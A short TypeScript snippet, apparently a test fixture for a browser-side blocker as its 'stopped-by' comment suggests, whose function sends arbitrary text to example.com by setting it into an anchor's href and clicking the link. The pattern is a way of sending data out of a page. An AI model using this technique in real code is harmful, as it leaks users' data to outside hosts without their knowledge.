// stopped-by: local/browser
export function send(text: string): void {
  const a = document.querySelector("a");
  if (a !== null) {
    const attr = document.createAttribute("href");
    attr.value = `https://example.com/?t=${encodeURIComponent(text)}`;
    a.setAttributeNode(attr);
    a.click();
  }
}
